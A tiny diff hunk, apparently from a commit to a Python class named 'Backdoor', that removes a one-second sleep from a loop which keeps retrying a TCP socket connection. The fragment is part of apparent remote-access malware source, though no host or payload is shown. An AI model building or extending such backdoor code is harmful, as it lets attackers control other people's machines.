@@ -23,7 +23,6 @@ class Backdoor:
 	def connect(self):
 		while True:
 			if not self.connected:
-				time.sleep(1)
 				print("try connect")
 				try:
 					self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
